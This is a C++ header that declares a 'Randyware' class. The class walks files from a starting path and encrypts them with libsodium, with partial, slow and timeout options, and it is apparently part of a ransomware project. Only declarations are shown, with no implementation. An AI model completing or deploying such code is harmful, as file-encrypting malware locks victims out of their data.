#include <cstddef>
#include <expected>
#include <filesystem>
#include <variant>

#include "filer.hpp"
#include "sodium.hpp"

namespace Randy {

enum class RandyErrors {};

using RandywareErrors = std::variant<SodiumError, RandyErrors>;

class Randyware : public Filer {
   public:
    //.Copy constructor and assignment operator are deleted to prevent copying
    Randyware(const Randyware&) = delete;
    Randyware& operator=(const Randyware&) = delete;

    // Move constructor and assignment operator are deleted to prevent moving
    Randyware(Randyware&&) = default;
    Randyware& operator=(Randyware&&) = delete;

    auto static init(const fs::path& startingPath, size_t timeout = 0, bool partial = false,
                     bool slow = false) -> std::expected<Randyware, RandywareErrors>;

    auto encryptor() -> void;

   private:
    explicit Randyware(const fs::path& stating_path, Sodium encryptor, size_t timeout, bool partial,
                       bool slow)
        : Filer(stating_path),
          partial_{partial},
          slow_{slow},
          timeout_{timeout},
          encryptor_{std::move(encryptor)} {}

    auto readFileAsString(const fs::path& path, std::string& out) -> bool;
    auto writeEncrypted(const std::vector<std::byte>& enc, fs::path& filePath) -> void;

   private:
    bool partial_{false};
    bool slow_{false};
    size_t timeout_{0};
    Sodium encryptor_;
};

}  // namespace Randy
//
